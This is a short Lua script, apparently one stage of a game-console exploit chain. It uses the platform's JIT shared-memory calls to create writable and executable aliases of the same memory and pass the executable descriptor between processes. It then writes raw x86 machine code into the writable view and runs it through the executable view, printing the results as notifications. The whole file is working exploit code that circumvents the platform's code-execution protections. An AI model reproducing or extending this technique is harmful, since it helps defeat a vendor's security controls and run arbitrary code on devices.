
local base_fd_buf = jit_malloc(8)
local rw_fd_buf = jit_malloc(8)
local rx_fd_buf = jit_malloc(8)
local rw_addr_buf = jit_malloc(8)
local rx_addr_buf = malloc(8)
local name_buf = jit_malloc(8)

jit_write_buffer(name_buf, "test")

local create_ret = jit_sceKernelJitCreateSharedMemory(name_buf, 0x4000, 7, base_fd_buf)
send_notification("create_ret : " .. to_hex(create_ret))

local base_fd = jit_read32(base_fd_buf)
send_notification("base_fd : " .. to_hex(base_fd))

local rw_alias_ret = jit_sceKernelJitCreateAliasOfSharedMemory(base_fd, 3, rw_fd_buf)
send_notification("rw_alias_ret : " .. to_hex(rw_alias_ret))
local rx_alias_ret = jit_sceKernelJitCreateAliasOfSharedMemory(base_fd, 5, rx_fd_buf)
send_notification("rx_alias_ret : " .. to_hex(rx_alias_ret))

local rw_fd = jit_read32(rw_fd_buf)
send_notification("rw_fd : " .. to_hex(rw_fd))
local rx_fd = jit_read32(rx_fd_buf)
send_notification("rx_fd : " .. to_hex(rx_fd))

local rw_map_ret = jit_sceKernelJitMapSharedMemory(rw_fd, 3, rw_addr_buf)
send_notification("rw_map_ret : " ..to_hex(rw_map_ret))
local rw_addr = jit_read64(rw_addr_buf)
send_notification("rw_addr : " ..to_hex(rw_addr))

local main_rx_fd = jit_send_recv_fd(rx_fd, NEW_JIT_SOCK, NEW_MAIN_SOCK)
send_notification("main_rx_fd : " .. to_hex(main_rx_fd))

local rx_map_ret = sceKernelJitMapSharedMemory(main_rx_fd, 5, rx_addr_buf)
send_notification("rx_map_ret : " ..to_hex(rx_map_ret))
local rx_addr = read64(rx_addr_buf)
send_notification("rx_addr : " ..to_hex(rx_addr))

--mov rax, 0x4141414141414141
jit_write64(rw_addr, 0x414141414141B848)
jit_write64(rw_addr + 8, 0xC34141)

send_notification(to_hex(read64(rx_addr)))
send_notification(to_hex(read64(rx_addr + 8)))

rwx_test = func_wrap(rx_addr)

send_notification(to_hex(rwx_test()))
